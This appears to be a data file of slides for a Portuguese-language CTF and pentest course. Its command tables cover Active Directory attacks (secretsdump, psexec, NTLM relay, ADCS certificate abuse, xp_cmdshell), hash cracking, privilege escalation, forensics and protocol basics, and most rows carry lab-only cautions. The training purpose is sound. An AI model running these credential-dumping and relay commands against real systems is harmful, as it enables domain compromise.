          ['hashcat -m 13100 kerb.txt rockyou.txt', 'Após Kerberoast.', 'Crack offline do TGS.', 'Senha recuperada permite novo acesso.', 'Pode demorar muito.'],
          ['bloodhound-python -d <domain> -u <user> -p <pass> -ns <dc_ip> -c All', 'Com credencial válida.', 'Coleta relações AD.', 'Gera JSON para importar no BloodHound.', 'DNS e horário precisam estar corretos.'],
          ['crackmapexec smb <IP> -d <domain> -u <user> -p <pass>', 'Validar credencial.', 'Confirma autenticação SMB.', 'Mostra status e às vezes Pwn3d.', 'Não faça spray em ambiente real.'],
          ['crackmapexec smb <IP> -u <user> -p <pass> --shares', 'Credencial válida.', 'Lista shares por permissão.', 'READ/WRITE direciona coleta.', 'Pode bloquear conta se senha errada repetida.'],
          ['evil-winrm -i <IP> -u <user> -p <pass>', 'WinRM aberto e credencial autorizada.', 'Abre shell PowerShell remoto.', 'Prompt remoto no host Windows.', 'Registra autenticação e comandos.'],
          ['secretsdump.py <domain>/<user>:<pass>@<IP>', 'Quando tem permissão alta ou DCSync.', 'Extrai hashes via protocolos AD.', 'Pode retornar NTDS/hashes do domínio.', 'Impacto alto; somente lab autorizado.'],
          ['psexec.py <domain>/<user>:<pass>@<IP>', 'Admin local em lab.', 'Execução remota via SMB service.', 'Shell como SYSTEM se permitido.', 'Muito ruidoso e cria serviço temporário.'],
        ]
      }
    }
  },
  {
    id: 'd2-manual-bloodhound-cme', title: 'Manual de Comandos — BloodHound, CME e Shares', day: 2, topic: 'Active Directory',
    type: 'table',
    content: {
      table: {
        headers: ['Comando', 'Quando usar', 'Por que usar', 'O que acontece / como ler', 'Cuidado'],
        rows: [
          ['bloodhound-python -d <domain> -u <user> -p <pass> -ns <dc_ip> -c DCOnly', 'Coleta inicial menor.', 'Menos volume que All.', 'Coleta dados do DC e domínio.', 'Pode perder sessões/local admin.'],
          ['bloodhound-python -d <domain> -u <user> -p <pass> -ns <dc_ip> -c All', 'Coleta completa em lab.', 'Mapeia grupos, ACLs, sessões e trusts.', 'Importe JSON e busque caminhos.', 'Mais ruidoso e demorado.'],
          ['crackmapexec smb <subnet>/24', 'Inventário em rede de lab.', 'Identifica hosts SMB.', 'Mostra hostname, domínio e signing.', 'Use apenas escopo autorizado.'],
          ['crackmapexec smb <IP> --shares -u <user> -p <pass>', 'Após login válido.', 'Enumera shares acessíveis.', 'READ/WRITE definem próximos passos.', 'Não faça escrita sem necessidade.'],
          ['crackmapexec smb <IP> --users -u <user> -p <pass>', 'Quer usuários via SMB/RPC.', 'Ajuda montar users.txt.', 'Lista contas quando permitido.', 'Pode falhar com baixa permissão.'],
          ['crackmapexec smb <IP> --pass-pol -u <user> -p <pass>', 'Antes de spray em lab.', 'Ver política de senha.', 'Mostra lockout threshold e complexidade.', 'Não faça spray se lockout baixo.'],
          ['smbmap -H <IP> -u <user> -p <pass>', 'Alternativa para shares.', 'Visualiza permissões por share.', 'READ/WRITE/NO ACCESS.', 'Resultado depende de credencial.'],
          ['smbmap -H <IP> -u <user> -p <pass> -R <share>', 'Listagem recursiva de share.', 'Acha arquivos profundos.', 'Mostra árvore de diretórios.', 'Pode gerar muito output.'],
          ['smbget -R smb://<IP>/<share> -U <user>', 'Baixar share recursivo.', 'Copia arquivos para análise local.', 'Pede senha e baixa conteúdo.', 'Organize em pasta do caso.'],
          ['gpp-decrypt <cpassword>', 'Encontrou Groups.xml com cpassword.', 'Decifra senha GPP legada.', 'Retorna senha em claro.', 'GPP é legado; confirme origem do arquivo.'],
        ]
      }
    }
  },
  {
    id: 'd2-manual-forensics-disk-pcap', title: 'Manual de Comandos — Disco, PCAP e Evidências', day: 2, topic: 'Forense',
    type: 'table',
    content: {
      table: {
        headers: ['Comando', 'Quando usar', 'Por que usar', 'O que acontece / como ler', 'Cuidado'],
        rows: [
          ['sha256sum imagem.dd', 'Recebeu imagem forense.', 'Verifica integridade.', 'Hash deve bater com referência.', 'Nunca altere evidência original.'],
          ['mmls imagem.dd', 'Imagem com partições.', 'Mostra layout e offsets.', 'Use offset para montar/analisar partição.', 'Offset é em setores.'],
          ['fls -r imagem.dd', 'Listar arquivos via Sleuth Kit.', 'Enumera filesystem sem montar.', 'Mostra inodes e caminhos.', 'Use offset se houver partição.'],
          ['icat imagem.dd <inode> > arquivo', 'Extrair arquivo por inode.', 'Recupera evidência específica.', 'Arquivo sai para análise local.', 'Inode errado extrai outro conteúdo.'],
          ['foremost imagem.dd -o output/', 'File carving.', 'Recupera arquivos por assinatura.', 'Cria output por tipo de arquivo.', 'Não preserva sempre nome original.'],
          ['exiftool arquivo', 'Metadados.', 'Lê datas, autor, câmera, software.', 'Mostra campos úteis de atribuição/timeline.', 'Metadado pode ser falsificado.'],
          ['capinfos captura.pcap', 'Primeira visão de PCAP.', 'Mostra duração, pacotes e formato.', 'Ajuda dimensionar análise.', 'Não substitui inspeção de protocolo.'],
          ['tshark -r captura.pcap -q -z io,phs', 'Resumo por protocolo.', 'Entende composição do tráfego.', 'Mostra hierarquia e percentuais.', 'Protocolos encapsulados podem confundir.'],
          ['tshark -r captura.pcap -q -z conv,tcp', 'Ver conversas TCP.', 'Identifica maiores fluxos.', 'Lista endpoints, pacotes e bytes.', 'UDP precisa conv,udp.'],
          ['tshark -r captura.pcap -Y "http.request" -T fields -e frame.time -e ip.src -e http.host -e http.request.uri', 'Extrair requests HTTP.', 'Gera timeline objetiva.', 'Mostra hora, origem, host e URI.', 'HTTPS não revela URI sem decryption.'],
          ['tshark -r captura.pcap -Y "ftp.request.command == USER || ftp.request.command == PASS" -T fields -e ftp.request.command -e ftp.request.arg', 'Buscar credenciais FTP.', 'FTP usa texto claro.', 'Retorna USER e PASS.', 'Não publique senhas reais.'],
          ['tcpdump -i tun0 host <IP> -w captura.pcap', 'Capturar tráfego de lab.', 'Gera PCAP para análise.', 'Arquivo abre no Wireshark.', 'Capture só escopo autorizado.'],
        ]
      }
    }
  },

  // ==================== MANUAL DE COMANDOS - DIA 3 ====================
  {
    id: 'd3-manual-volatility', title: 'Manual de Comandos — Volatility 3', day: 3, topic: 'Forense',
    type: 'table',
    content: {
      table: {
        headers: ['Comando', 'Quando usar', 'Por que usar', 'O que acontece / como ler', 'Cuidado'],
        rows: [
          ['python3 vol.py -f mem.raw windows.info', 'Primeiro comando no dump.', 'Identifica sistema e símbolos.', 'Mostra kernel, build e camada.', 'Se falhar, dump/perfil pode estar ruim.'],
          ['python3 vol.py -f mem.raw windows.pslist', 'Listar processos ativos.', 'Triagem básica.', 'Mostra PID, PPID, nome e horários.', 'Processo encerrado pode não aparecer.'],
          ['python3 vol.py -f mem.raw windows.psscan', 'Suspeita de processo oculto/terminado.', 'Varre estruturas de processo na memória.', 'Pode achar processos não listados.', 'Mais falso positivo que pslist.'],
          ['python3 vol.py -f mem.raw windows.pstree', 'Analisar relação pai-filho.', 'Detecta cadeia anômala.', 'Office -> cmd -> powershell é suspeito.', 'PPID pode ser reutilizado.'],
          ['python3 vol.py -f mem.raw windows.cmdline', 'Ver argumentos de execução.', 'EncodedCommand e paths revelam intenção.', 'Mostra command line por PID.', 'Pode estar vazio em alguns casos.'],
          ['python3 vol.py -f mem.raw windows.netscan', 'Investigar conexões.', 'Relaciona processo com rede.', 'Mostra local/remote IP, porta e PID.', 'Conexões antigas podem aparecer.'],
          ['python3 vol.py -f mem.raw windows.dlllist --pid <PID>', 'Processo suspeito.', 'Lista DLLs carregadas.', 'Path temporário ou incomum é sinal.', 'Muitas DLLs legítimas.'],
          ['python3 vol.py -f mem.raw windows.malfind', 'Suspeita de injeção.', 'Procura regiões RWX/MZ.', 'Retorna VADs suspeitos e bytes.', 'Confirme com contexto; pode ter falso positivo.'],
          ['python3 vol.py -f mem.raw windows.filescan', 'Procurar arquivo em memória.', 'Acha handles/objetos de arquivo.', 'Mostra offsets físicos.', 'Muitos resultados; filtre com grep.'],
          ['python3 vol.py -f mem.raw windows.dumpfiles --physaddr <offset>', 'Extrair arquivo achado.', 'Coleta evidência para análise.', 'Gera arquivo extraído.', 'Offset precisa vir de filescan.'],
          ['python3 vol.py -f mem.raw windows.registry.hivelist', 'Analisar registry em memória.', 'Lista hives carregadas.', 'Mostra offsets de SAM/SYSTEM/NTUSER.', 'Nem todo hive está completo.'],
          ['python3 vol.py -f mem.raw windows.hashdump', 'Credenciais locais em dump.', 'Extrai hashes quando possível.', 'Mostra usuários e hashes locais.', 'Acesso e versão podem impedir.'],
        ]
      }
    }
  },
  {
    id: 'd3-manual-malware-static', title: 'Manual de Comandos — Malware Estático e Binários', day: 3, topic: 'Malware',
    type: 'table',
    content: {
      table: {
        headers: ['Comando', 'Quando usar', 'Por que usar', 'O que acontece / como ler', 'Cuidado'],
        rows: [
          ['file amostra.bin', 'Primeiro comando em arquivo desconhecido.', 'Identifica tipo e arquitetura.', 'Mostra PE, ELF, script, archive etc.', 'Pode ser enganado por header falso.'],
          ['sha256sum amostra.bin', 'Registrar IOC.', 'Hash identifica amostra.', 'Use em relatório e busca defensiva.', 'Hash muda se arquivo mudar 1 byte.'],
          ['strings -a amostra.bin', 'Triagem estática.', 'Extrai texto ASCII.', 'URLs, comandos e paths aparecem.', 'Ofuscação pode esconder strings.'],
          ['strings -el amostra.bin', 'Amostra Windows/Unicode.', 'Extrai UTF-16 little endian.', 'Pode revelar strings que -a não mostra.', 'Gera ruído.'],
          ['grep -Ei "http|cmd.exe|powershell|token|password"', 'Filtrar strings suspeitas.', 'Foca IOCs e comportamento.', 'Mostra URLs, comandos e segredos.', 'Termos podem ser benignos.'],
          ['xxd -l 256 amostra.bin', 'Olhar bytes iniciais.', 'Confirma magic bytes/header.', 'MZ, ELF, PK indicam formato.', 'Não interpreta binário completo.'],
          ['readelf -h amostra.elf', 'Binário Linux ELF.', 'Lê cabeçalho.', 'Mostra arquitetura, entrypoint e tipo.', 'Só funciona em ELF.'],
          ['readelf -s amostra.elf | head', 'Ver símbolos ELF.', 'Identifica funções/imports se não stripado.', 'Nomes podem indicar comportamento.', 'Binário stripped terá pouco dado.'],
          ['objdump -d amostra.elf | head -80', 'Ver assembly inicial.', 'Triagem de fluxo.', 'Mostra instruções e chamadas.', 'Exige leitura de assembly.'],
          ['binwalk amostra.bin', 'Suspeita de arquivo embutido.', 'Procura assinaturas internas.', 'Mostra offsets de arquivos comprimidos.', 'Assinatura não garante extração útil.'],
          ['upx -t amostra.bin', 'Suspeita de UPX.', 'Testa packer UPX.', 'Informa se é empacotado.', 'Packer custom não aparece.'],
          ['upx -d amostra.bin -o unpacked.bin', 'UPX confirmado em lab.', 'Desempacota para análise.', 'Gera binário mais legível.', 'Nunca execute amostra fora de sandbox.'],
        ]
      }
    }
  },
  {
    id: 'd3-manual-privesc', title: 'Manual de Comandos — Privesc Linux e Windows', day: 3, topic: 'Red Team',
    type: 'table',
    content: {
      table: {
        headers: ['Comando', 'Quando usar', 'Por que usar', 'O que acontece / como ler', 'Cuidado'],
        rows: [
          ['sudo -l', 'Shell Linux inicial.', 'Busca comandos permitidos como root.', 'NOPASSWD pode virar root via GTFOBins.', 'Pode exigir senha.'],
          ['find / -perm -4000 -type f 2>/dev/null', 'Linux privesc.', 'Lista SUID.', 'Compare com lista padrão da distro.', 'SUID comum não é vulnerável sozinho.'],
          ['getcap -r / 2>/dev/null', 'Linux privesc por capabilities.', 'Capabilities perigosas substituem SUID.', 'cap_setuid+ep em interpretador é crítico.', 'Nem toda capability é explorável.'],
          ['cat /etc/crontab; ls -la /etc/cron.*', 'Suspeita de tarefa agendada.', 'Cron root executando script gravável é vetor.', 'Veja usuário, comando e frequência.', 'Não altere arquivo sem entender timing.'],
          ['find / -writable -type f 2>/dev/null | grep -v proc', 'Procurar escrita indevida.', 'Arquivo gravável por usuário pode ser vetor.', 'Procure config/script executado por root.', 'Muitos resultados normais em /tmp.'],
          ['whoami /priv', 'Shell Windows inicial.', 'Lista privilégios de token.', 'SeImpersonate/SeBackup são relevantes.', 'Disabled pode precisar contexto.'],
          ['whoami /groups', 'Windows privesc.', 'Ver grupos privilegiados.', 'Backup Operators, Remote Management, Administrators importam.', 'Grupo não garante permissão em todo host.'],
          ['systeminfo', 'Windows versão/patch.', 'Base para hipóteses de vulnerabilidade.', 'Mostra OS, hotfixes e arquitetura.', 'Exploit de kernel deve ser último recurso.'],
          ['wmic qfe get Caption,Description,HotFixID,InstalledOn', 'Checar patches.', 'Confirma hotfixes instalados.', 'Ajuda descartar CVEs antigas.', 'wmic pode faltar em versões novas.'],
          ['wmic service get name,displayname,pathname,startmode', 'Serviços Windows.', 'Busca path não aspado e binários.', 'Path com espaços sem aspas é pista.', 'Precisa verificar permissão de escrita.'],
          ['sc qc <servico>', 'Inspecionar serviço específico.', 'Mostra binPath e conta de execução.', 'LocalSystem + path alterável é forte.', 'Não altere serviço sem plano de reversão em lab.'],
          ['reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', 'Checar AlwaysInstallElevated.', 'Parte de vetor MSI.', 'Precisa HKLM e HKCU = 1.', 'Se só uma chave existe, não basta.'],
          ['cmdkey /list', 'Credenciais salvas.', 'Pode indicar acesso a outro recurso.', 'Lista alvos com credenciais armazenadas.', 'Não mostra senha em claro.'],
          ['netstat -ano', 'Portas/conexões Windows.', 'Acha serviços locais e conexões externas.', 'PID relaciona com tasklist.', 'Porta aberta não prova vulnerabilidade.'],
        ]
      }
    }
  },
  {
    id: 'd3-manual-ad-advanced', title: 'Manual de Comandos — AD Avançado em Labs', day: 3, topic: 'Active Directory',
    type: 'table',
    content: {
      table: {
        headers: ['Comando', 'Quando usar', 'Por que usar', 'O que acontece / como ler', 'Cuidado'],
        rows: [
          ['net rpc password <user> "<nova>" -U <domain>/<user>%<pass> -S <dc_ip>', 'BloodHound mostrou ForceChangePassword.', 'Altera senha de conta alvo sem saber a atual.', 'Se funcionar, você autentica como alvo.', 'Impacto alto; somente lab autorizado.'],
          ['secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL', 'Tem NTDS.dit e SYSTEM offline.', 'Extrai hashes do domínio offline.', 'Retorna hashes NTLM/Kerberos.', 'Proteja arquivos; são extremamente sensíveis.'],
          ['diskshadow /s script.txt', 'SeBackupPrivilege em DC lab.', 'Cria shadow copy para copiar NTDS.', 'Volume shadow copy aparece para robocopy.', 'Comando altera estado do sistema.'],
          ['robocopy /b <shadow_path> . ntds.dit', 'Após shadow copy.', 'Copia usando backup mode.', 'Extrai arquivo bloqueado.', 'Caminho precisa estar correto.'],
          ['certipy find -u <user>@<domain> -p <pass> -dc-ip <IP> -vulnerable', 'ADCS suspeito.', 'Enumera templates vulneráveis.', 'Mostra ESC findings.', 'Depende de ADCS instalado.'],
          ['certipy req -u <user>@<domain> -p <pass> -ca <CA> -template <template> -upn administrator@<domain>', 'Template vulnerável em lab.', 'Solicita certificado abusável.', 'Gera .pfx se permitido.', 'Impacto alto; só com evidência de ESC.'],
          ['mssqlclient.py <domain>/<user>:<pass>@<IP> -windows-auth', 'MSSQL com auth Windows.', 'Acessa banco com credencial AD.', 'Prompt SQL permite enumeração.', 'Não execute comandos destrutivos.'],
          ['enable_xp_cmdshell', 'MSSQL sysadmin em lab.', 'Habilita execução de comandos OS.', 'Permite xp_cmdshell.', 'Altíssimo impacto e ruidoso.'],
          ['xp_cmdshell "whoami"', 'xp_cmdshell habilitado.', 'Confirma contexto do serviço SQL.', 'Retorna usuário do processo SQL.', 'Apenas lab autorizado.'],
          ['responder -I tun0', 'Lab com coerção NTLM autorizada.', 'Captura NetNTLM quando host autentica.', 'Mostra hash NetNTLMv2.', 'Não use em rede real.'],
          ['ntlmrelayx.py -tf targets.txt -smb2support', 'Lab de relay autorizado.', 'Repassa autenticação NTLM.', 'Pode obter sessão se signing/mitigações permitirem.', 'Técnica intrusiva; precisa escopo explícito.'],
        ]
      }
    }
  },

  // ==================== MANUAL DE COMANDOS - DIA 4 ====================
  {
    id: 'd4-manual-hashcat-john', title: 'Manual de Comandos — Hashcat e John', day: 4, topic: 'Revisão',
    type: 'table',
    content: {
      table: {
        headers: ['Comando', 'Quando usar', 'Por que usar', 'O que acontece / como ler', 'Cuidado'],
        rows: [
          ['hashid hash.txt', 'Não sabe tipo de hash.', 'Sugere formatos prováveis.', 'Lista candidatos.', 'Não é certeza; valide pelo contexto.'],
          ['hashcat --example-hashes | grep -i ntlm', 'Escolher modo.', 'Consulta exemplos oficiais.', 'Ajuda achar -m correto.', 'grep no Windows pode variar; use busca no arquivo.'],
          ['hashcat -m 0 hash.txt rockyou.txt', 'MD5 simples.', 'Tenta wordlist contra MD5.', 'Mostra senha se quebrar.', 'MD5 pode ser outro formato parecido.'],
          ['hashcat -m 1000 hash.txt rockyou.txt', 'NTLM Windows.', 'Quebra hash NTLM offline.', 'Resultado usuário:hash:senha ou hash:senha.', 'Não confundir com NetNTLMv2.'],
          ['hashcat -m 5600 hash.txt rockyou.txt', 'NetNTLMv2 capturado.', 'Crack de desafio/resposta NTLMv2.', 'Senha aparece se wordlist cobre.', 'Não permite pass-the-hash direto.'],
          ['hashcat -m 18200 asrep.txt rockyou.txt', 'AS-REP Roasting.', 'Modo correto para Kerberos AS-REP etype 23.', 'Recupera senha de usuário vulnerável.', 'Usuário pode ter senha forte.'],
          ['hashcat -m 13100 kerb.txt rockyou.txt', 'Kerberoasting.', 'Modo TGS Kerberos etype 23.', 'Recupera senha da conta de serviço.', 'Arquivos grandes precisam GPU/tempo.'],
          ['hashcat --show -m 1000 hash.txt', 'Ver hashes já quebrados.', 'Consulta potfile.', 'Mostra resultados anteriores.', 'Use mesmo modo -m.'],
          ['hashcat -m 1000 hash.txt rockyou.txt -r rules/best64.rule', 'Wordlist com regra.', 'Gera variações comuns.', 'Aumenta chance de quebra.', 'Aumenta tempo.'],
          ['john hash.txt --wordlist=rockyou.txt', 'Formato suportado pelo John.', 'Alternativa simples.', 'Mostra progresso e senhas.', 'Às vezes precisa converter hash.'],
          ['john --show hash.txt', 'Mostrar senhas quebradas.', 'Consulta pot do John.', 'Exibe senha recuperada.', 'Precisa mesmo arquivo/formato.'],
          ['zip2john arquivo.zip > zip.hash', 'ZIP protegido.', 'Converte para John.', 'Gera hash crackável.', 'Só para arquivos do lab/escopo.'],
          ['john zip.hash --wordlist=rockyou.txt', 'Após zip2john.', 'Crack de senha ZIP.', 'Mostra senha se encontrada.', 'Não remove senha automaticamente.'],
        ]
      }
    }
  },
  {
    id: 'd4-manual-crypto-stego', title: 'Manual de Comandos — Crypto, Encoding e Stego', day: 4, topic: 'CTF',
    type: 'table',
    content: {
      table: {
        headers: ['Comando', 'Quando usar', 'Por que usar', 'O que acontece / como ler', 'Cuidado'],
        rows: [
          ['echo "SGVsbG8=" | base64 -d', 'Texto parece Base64.', 'Decodifica encoding comum.', 'Retorna texto/binário original.', 'Base64 não é criptografia.'],
          ['echo -n "texto" | base64', 'Precisa codificar texto.', 'Gera Base64.', 'Saída pode ser usada em payload/lab.', 'Use -n para evitar newline.'],
          ['echo "48656c6c6f" | xxd -r -p', 'Texto hexadecimal.', 'Converte hex para bytes.', 'Retorna conteúdo legível se for texto.', 'Hex inválido gera saída estranha.'],
          ['echo -n "Hello" | xxd -p', 'Transformar texto em hex.', 'Útil para comparar bytes.', 'Mostra representação hexadecimal.', 'Não confunda com hash.'],
          ['echo "Uryyb" | tr "A-Za-z" "N-ZA-Mn-za-m"', 'Suspeita de ROT13.', 'Decifra rotação 13.', 'Texto legível aparece se for ROT13.', 'Só funciona para alfabeto latino.'],
          ['file imagem.png', 'Arquivo desconhecido.', 'Identifica tipo real.', 'Mostra PNG/JPEG/ZIP/etc.', 'Extensão pode mentir.'],
          ['strings imagem.png | grep -i flag', 'CTF/stego simples.', 'Busca texto embutido.', 'Pode revelar flag ou pista.', 'Pode perder dados comprimidos.'],
          ['exiftool imagem.jpg', 'Imagem com metadados.', 'Lê EXIF, autor, GPS, comentários.', 'Metadado pode conter pista.', 'Metadado pode ser falso.'],
          ['steghide info imagem.jpg', 'Suspeita de steghide.', 'Verifica dado oculto.', 'Informa se há conteúdo e pede senha.', 'Não funciona em PNG.'],
          ['steghide extract -sf imagem.jpg -p "<senha>"', 'Senha stego conhecida.', 'Extrai arquivo escondido.', 'Cria arquivo de saída.', 'Use apenas arquivos de desafio.'],
          ['binwalk arquivo.bin', 'Suspeita de arquivo embutido.', 'Procura assinaturas.', 'Mostra offsets e tipos.', 'Assinatura não garante extração.'],
          ['binwalk -e arquivo.bin', 'Quer extrair embutidos.', 'Tenta extrair automaticamente.', 'Cria pasta _arquivo.extracted.', 'Revise o que foi extraído.'],
          ['foremost arquivo.dd -o output/', 'Carving em imagem/dump.', 'Recupera arquivos por assinatura.', 'Organiza por tipo.', 'Pode gerar muitos falsos positivos.'],
          ['zsteg imagem.png', 'PNG/BMP com LSB suspeito.', 'Testa canais/bitplanes.', 'Mostra dados ocultos se houver.', 'Pode gerar muito ruído.'],
        ]
      }
    }
  },
  {
    id: 'd4-manual-reporting-evidence', title: 'Manual de Comandos — Evidência, Organização e Relatório', day: 4, topic: 'Revisão',
    type: 'table',
    content: {
      table: {
        headers: ['Comando', 'Quando usar', 'Por que usar', 'O que acontece / como ler', 'Cuidado'],
        rows: [
          ['mkdir -p caso/{scans,loot,pcap,notes,screenshots}', 'Início de lab/caso.', 'Organiza evidências.', 'Cria estrutura de pastas.', 'No PowerShell use New-Item equivalente.'],
          ['script -a notes/terminal.log', 'Linux: registrar terminal.', 'Cria log de comandos e saídas.', 'Tudo fica no arquivo até exit.', 'Pode registrar senhas digitadas.'],
          ['tee -a notes/comandos.txt', 'Salvar output e ver na tela.', 'Documenta sem perder feedback.', 'Comando envia saída para arquivo e terminal.', 'Use com cuidado para dados sensíveis.'],
          ['date -u', 'Registrar horário UTC.', 'Padroniza timeline.', 'Mostra data/hora UTC.', 'Anote timezone se usar hora local.'],
          ['sha256sum arquivo > arquivo.sha256', 'Registrar hash de evidência.', 'Prova integridade.', 'Cria arquivo com hash.', 'Recalcule após cópia.'],
          ['find loot -type f -maxdepth 3 | sort', 'Inventário de arquivos coletados.', 'Saber o que foi baixado.', 'Lista arquivos organizados.', 'maxdepth pode esconder subpastas profundas.'],
          ['grep -R "TODO\\|password\\|flag" loot notes 2>/dev/null', 'Revisar achados.', 'Busca termos importantes.', 'Mostra arquivos e linhas.', 'Não substitui leitura manual.'],
          ['python3 -m http.server 8000', 'Servir arquivos em lab local.', 'Transferência simples para VM.', 'Abre HTTP na pasta atual.', 'Não rode em pasta com segredos fora do lab.'],
          ['scp arquivo user@<IP>:/tmp/', 'Copiar arquivo via SSH.', 'Transferência autenticada.', 'Arquivo chega no destino.', 'Registra acesso SSH.'],
          ['tar -czf evidencias.tgz scans loot notes', 'Empacotar entrega.', 'Agrupa evidências.', 'Cria arquivo compactado.', 'Revise conteúdo antes de compartilhar.'],
          ['pandoc report.md -o report.pdf', 'Gerar PDF do relatório.', 'Converte Markdown para PDF.', 'Cria relatório final.', 'Exige pandoc/engine instalado.'],
        ]
      }
    }
  },
];

const baseSlides: Slide[] = [
  // ==================== DAY 1 ====================
  {
    id: 'd1-tcpip-theory', title: 'Redes TCP/IP — Fundamentos', day: 1, topic: 'Redes',
    type: 'theory',
    content: {
      theory: [
        'TCP/IP é o conjunto de protocolos que sustenta toda a internet. Entender como ele funciona é pré-requisito para qualquer área de segurança.',
        'TCP (Transmission Control Protocol): orientado à conexão, entrega garantida e ordenada. Usa o 3-way handshake: SYN → SYN-ACK → ACK.',
        'UDP (User Datagram Protocol): sem conexão, mais rápido mas sem garantia de entrega. Usado por DNS, DHCP, streaming.',
        'IP (Internet Protocol): endereçamento lógico de máquinas na rede. IPv4 usa 32 bits (ex: 192.168.1.10). Máscara de sub-rede define quais bits identificam a rede.',
        'CIDR: notação compacta de máscara. /24 = 255.255.255.0 = 256 endereços. /32 = host único.',
        'Em CTF: compreender TCP/IP é essencial para análise de PCAP, enumeração de serviços e entender o que cada ferramenta faz na camada de rede.',
      ],
    }
  },
  {
    id: 'd1-ports-table', title: 'Portas e Serviços — Referência', day: 1, topic: 'Redes',
    type: 'table',
    content: {
      table: {
        headers: ['Porta', 'Protocolo', 'Serviço'],
        rows: [
          ['21', 'TCP', 'FTP — transferência de arquivo'],
          ['22', 'TCP', 'SSH — acesso remoto seguro'],
          ['23', 'TCP', 'Telnet — acesso remoto sem criptografia'],
          ['25', 'TCP', 'SMTP — envio de e-mail'],
          ['53', 'TCP/UDP', 'DNS — resolução de nomes'],
          ['80', 'TCP', 'HTTP — web sem criptografia'],
          ['110', 'TCP', 'POP3 — recebimento de e-mail'],
          ['139/445', 'TCP', 'SMB — compartilhamento de arquivos Windows'],
          ['443', 'TCP', 'HTTPS — web com TLS'],
          ['3306', 'TCP', 'MySQL — banco de dados'],
          ['3389', 'TCP', 'RDP — área de trabalho remota Windows'],
          ['5985/5986', 'TCP', 'WinRM — gerenciamento remoto Windows'],
          ['8080/8443', 'TCP', 'HTTP alternativo / proxy'],
        ]
      },
      tips: ['Decore estas portas. Em qualquer scan Nmap, a leitura rápida das portas abertas define a estratégia inicial.']
    }
  },
  {
    id: 'd1-dns-theory', title: 'DNS — Teoria e Enumeração', day: 1, topic: 'Redes',
    type: 'theory',
    content: {
      theory: [
        'DNS (Domain Name System): traduz nomes de domínio para endereços IP. Porta 53, UDP para queries, TCP para zone transfers.',
        'Tipos de registro: A (IPv4), AAAA (IPv6), CNAME (alias), MX (mail), TXT (texto/SPF), NS (nameserver), PTR (reverso).',
        'Zone Transfer (AXFR): copia todos os registros de uma zona. Em ambientes mal configurados, expõe subdomínios internos.',
        'Em CTF: enumeração DNS é frequentemente o primeiro passo em máquinas com domínio — subdomínios revelam painéis admin, APIs internas.',
      ],
      commands: [
        'nslookup target.htb',
        'dig target.htb ANY',
        'dig @10.10.10.10 target.htb ANY',
        'dig axfr @10.10.10.10 target.htb   # zone transfer',
        'dig -x 10.10.10.10                  # reverse lookup',
        'host target.htb',
      ]
    }
  },
  {
    id: 'd1-dns-terminal', title: 'DNS — Terminal Realista', day: 1, topic: 'Redes',
    type: 'terminal',
    content: {
      terminal: [
        { type: 'prompt', text: 'dig axfr @10.10.10.10 target.htb' },
        { type: 'output', text: '; <<>> DiG 9.16.1 <<>> axfr @10.10.10.10 target.htb' },
        { type: 'output', text: ';; ANSWER SECTION:' },
        { type: 'output', text: 'target.htb.    600  IN  SOA   ns1.target.htb. admin.target.htb.' },
        { type: 'output', text: 'target.htb.    600  IN  A     10.10.10.10' },
        { type: 'output', text: 'admin.target.htb. 600 IN A   10.10.10.10' },
        { type: 'output', text: 'dev.target.htb.   600 IN A   10.10.10.10' },
        { type: 'output', text: 'ns1.target.htb.   600 IN A   10.10.10.10' },
        { type: 'comment', text: '# Zone transfer bem-sucedida: admin.target.htb e dev.target.htb revelados' },
        { type: 'prompt', text: 'echo "10.10.10.10  target.htb admin.target.htb dev.target.htb" >> /etc/hosts' },
        { type: 'comment', text: '# Adicione ao /etc/hosts antes de acessar os subdomínios' },
      ],
      tips: ['Se zone transfer falhar (REFUSED), tente subfinder, ffuf ou gobuster dns para descobrir subdomínios por força bruta.']
    }
  },
  {
    id: 'd1-http-theory', title: 'HTTP/HTTPS — Teoria', day: 1, topic: 'Web',
    type: 'theory',
    content: {
      theory: [
        'HTTP: protocolo sem estado, porta 80. HTTPS: HTTP sobre TLS, porta 443.',
        'Métodos: GET (buscar), POST (enviar dados), PUT/PATCH (atualizar), DELETE (remover), HEAD (só cabeçalhos), OPTIONS (capacidades).',
        'Códigos de status: 2xx sucesso, 3xx redirecionamento, 4xx erro do cliente (404 não encontrado, 403 proibido), 5xx erro do servidor.',
        'Cabeçalhos importantes: Authorization (credenciais), Cookie (sessão), X-Forwarded-For (IP real), Content-Type, Location (redirecionamento).',
      ],
      commands: [
        'curl -I http://target.htb              # somente cabeçalhos',
        'curl -v http://target.htb              # verbose com cabeçalhos',
        'curl -X POST -d "user=admin&pass=x" http://target.htb/login',
        'curl -b "session=abc123" http://target.htb/admin',
        'curl -H "Authorization: Bearer TOKEN" http://target.htb/api',
        'curl -L http://target.htb             # seguir redirecionamentos',
      ]
    }
  },
  {
    id: 'd1-ssh-theory', title: 'SSH — Teoria e Uso', day: 1, topic: 'Linux',
    type: 'theory',
    content: {
      theory: [
        'SSH (Secure Shell): acesso remoto criptografado, porta 22. Essencial para manter acesso após foothold.',
        'Autenticação por senha ou chave pública (preferível). Tipos de chave: RSA, ECDSA, ed25519.',
        'Arquivos: ~/.ssh/id_rsa (privada), ~/.ssh/id_rsa.pub (pública), ~/.ssh/authorized_keys (no servidor), ~/.ssh/known_hosts.',
        'Port Forwarding: -L (local), -R (remoto), -D (SOCKS proxy) — essencial para pivoting.',
      ],
      commands: [
        'ssh user@10.10.10.10',
        'ssh -i id_rsa user@10.10.10.10          # com chave privada',
        'ssh -p 2222 user@10.10.10.10            # porta alternativa',
        'ssh-keygen -t ed25519 -C "ctf"',
        'chmod 600 id_rsa                        # permissão obrigatória',
        'ssh -L 8080:localhost:80 user@10.10.10.10   # local port forward',
        'ssh -R 9090:localhost:4444 user@10.10.10.10 # remote port forward',
      ]
    }
  },
  {
    id: 'd1-ftp-terminal', title: 'FTP — Acesso Anônimo', day: 1, topic: 'Redes',
    type: 'terminal',
    content: {
      terminal: [
        { type: 'prompt', text: 'ftp 10.10.10.10' },
        { type: 'output', text: 'Connected to 10.10.10.10.' },
        { type: 'output', text: '220 (vsFTPd 3.0.3)' },
        { type: 'output', text: 'Name (10.10.10.10:kali): anonymous' },
        { type: 'output', text: '331 Please specify the password.' },
        { type: 'output', text: 'Password: [qualquer coisa]' },
        { type: 'output', text: '230 Login successful.' },
        { type: 'prompt', text: 'ls -la' },
